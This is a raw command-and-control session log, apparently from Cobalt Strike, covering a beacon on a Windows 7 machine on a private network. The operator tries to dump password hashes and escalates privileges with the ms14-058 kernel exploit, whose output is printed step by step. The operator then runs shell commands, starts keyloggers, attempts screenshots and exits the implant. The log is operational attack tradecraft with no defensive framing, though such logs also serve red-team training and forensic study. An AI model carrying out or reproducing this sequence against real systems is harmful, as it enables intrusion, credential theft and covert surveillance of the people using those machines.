01/20 16:31:42 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a; pid: 3636; os: Windows; version: 6.1; beacon arch: x86 (x64)
01/20 16:32:23 [input] <neo> hashdump
01/20 16:32:23 [error] this command requires administrator privileges
01/20 16:33:34 [checkin] host called home, sent: 12 bytes
01/20 16:36:10 [input] <neo> elevate ms14-058 new
01/20 16:36:10 [task] Tasked beacon to run windows/beacon_smb/bind_pipe (127.0.0.1:9876) via ms14-058
01/20 16:36:34 [checkin] host called home, sent: 307319 bytes
01/20 16:36:36 [output]
established link to child beacon: 172.17.2.54

01/20 16:36:36 [output]
received output:
[*] Getting Windows version...
[*] Solving symbols...
[*] Requesting Kernel loaded modules...
[*] pZwQuerySystemInformation required length 43816
[*] Parsing SYSTEM_INFO...
[*] 148 Kernel modules found
[*] Checking module \SystemRoot\system32\ntoskrnl.exe
[*] Good! nt found as ntoskrnl.exe at 0x03c5f000
[*] ntoskrnl.exe loaded in userspace at: 40000000
[*] pPsLookupProcessByProcessId in kernel: 0xFFFFF80003FB21FC
[*] pPsReferencePrimaryToken in kernel: 0xFFFFF80003FB59D0
[*] Registering class...
[*] Creating window...
[*] Allocating null page...
[*] Getting PtiCurrent...
[*] Good! dwThreadInfoPtr 0xFFFFF900C1E2CC30
[*] Creating a fake structure at NULL...
[*] Triggering vulnerability...
[!] Executing payload...


01/20 17:11:54 [input] <neo> shell command
01/20 17:11:54 [task] Tasked beacon to run: command
01/20 17:12:01 [input] <neo> ipconfig
01/20 17:12:01 [error] Unknown command: ipconfig
01/20 17:12:09 [input] <neo> pwd
01/20 17:12:09 [task] Tasked beacon to print working directory
01/20 17:12:37 [checkin] host called home, sent: 58 bytes
01/20 17:12:38 [output]
Current directory is C:\

01/20 17:12:38 [output]
received output:
'command' 不是内部或外部命令，也不是可运行的程序
或批处理文件。


01/20 17:13:03 [input] <neo> cd \
01/20 17:13:03 [task] cd \
01/20 17:13:09 [input] <neo> ipconfig
01/20 17:13:09 [error] Unknown command: ipconfig
01/20 17:13:21 [input] <neo> ping 172.17.2.56
01/20 17:13:21 [error] Unknown command: ping 172.17.2.56
01/20 17:13:38 [checkin] host called home, sent: 21 bytes
01/20 17:15:35 [input] <neo> shell ipconfig
01/20 17:15:35 [task] Tasked beacon to run: ipconfig
01/20 17:15:38 [checkin] host called home, sent: 51 bytes
01/20 17:15:38 [output]
received output:

Windows IP 配置


以太网适配器 本地连接:

   连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::dc70:1ea3:67b5:311%11
   IPv4 地址 . . . . . . . . . . . . : 172.17.2.54
   子网掩码  . . . . . . . . . . . . : 255.255.254.0
   默认网关. . . . . . . . . . . . . : 172.17.2.1

隧道适配器 isatap.{A8E7B51B-9069-45DB-BA99-054EA369046E}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 


01/20 17:22:38 [input] <neo> keylogger 1s
01/20 17:22:38 [error] keylogger error: '1s' is not a number
01/20 17:22:42 [input] <neo> keylogger 1
01/20 17:22:42 [task] Tasked beacon to log keystrokes in 1 (x86)
01/20 17:23:34 [input] <neo> keylogger pid
01/20 17:23:34 [error] keylogger error: 'pid' is not a number
01/20 17:23:38 [checkin] host called home, sent: 65110 bytes
01/20 17:23:48 [error] could not open process 1: 87
01/20 17:23:48 [error] Could not connect to pipe: 2
01/20 17:24:22 [input] <neo> job
01/20 17:24:22 [error] Unknown command: job
01/20 17:24:39 [input] <neo> jobs
01/20 17:24:39 [task] Tasked beacon to list jobs
01/20 17:24:48 [checkin] host called home, sent: 20 bytes
01/20 17:24:48 [output]


01/20 17:25:00 [input] <neo> jobkill
01/20 17:25:00 [error] jobkill error: not enough arguments
01/20 17:25:08 [input] <neo> keylogger 1
01/20 17:25:08 [task] Tasked beacon to log keystrokes in 1 (x86)
01/20 17:25:16 [input] <neo> keylogger 1 x64
01/20 17:25:16 [task] Tasked beacon to log keystrokes in 1 (x64)
01/20 17:25:48 [checkin] host called home, sent: 146592 bytes
01/20 17:25:56 [input] <neo> screenshot 1
01/20 17:25:56 [task] Tasked beacon to take a screenshot in 1/x86
01/20 17:26:08 [error] could not open process 1: 87
01/20 17:26:08 [error] Could not connect to pipe: 2
01/20 17:26:08 [error] could not open process 1: 87
01/20 17:26:08 [error] Could not connect to pipe: 2
01/20 17:26:15 [input] <neo> jobs
01/20 17:26:15 [task] Tasked beacon to list jobs
01/20 17:26:37 [input] <neo> jobkill
01/20 17:26:37 [error] jobkill error: not enough arguments
01/20 17:26:59 [input] <neo> screenshot 1
01/20 17:26:59 [task] Tasked beacon to take a screenshot in 1/x86
01/20 17:27:06 [input] <neo> jobkill 1
01/20 17:27:06 [task] Tasked beacon to kill job 1
01/20 17:27:08 [checkin] host called home, sent: 324786 bytes
01/20 17:27:09 [input] <neo> jobkill 2
01/20 17:27:09 [task] Tasked beacon to kill job 2
01/20 17:27:13 [input] <neo> jobkill *
01/20 17:27:13 [error] jobkill error: '*' is not a number
01/20 17:27:19 [input] <neo> jobkill all
01/20 17:27:19 [error] jobkill error: 'all' is not a number
01/20 17:27:24 [input] <neo> jobs
01/20 17:27:24 [task] Tasked beacon to list jobs
01/20 17:27:28 [error] could not open process 1: 87
01/20 17:27:28 [error] Could not connect to pipe: 2
01/20 17:27:28 [output]


01/20 17:27:28 [error] could not open process 1: 87
01/20 17:27:28 [error] Could not connect to pipe: 2
01/20 17:27:49 [input] <neo> exit
01/20 17:27:49 [task] Tasked beacon to exit
01/20 17:28:04 [input] <neo> remove
01/20 17:28:04 [error] Unknown command: remove
01/20 17:28:08 [input] <neo> del
01/20 17:28:08 [error] Unknown command: del
01/20 17:28:24 [input] <neo> close
01/20 17:28:24 [error] Unknown command: close
01/20 17:28:28 [checkin] host called home, sent: 38 bytes
01/20 17:28:28 [output]


01/20 17:28:28 [output]
beacon exit.

01/20 17:28:29 [input] <neo> clear
01/20 17:28:29 [task] Cleared beacon queue
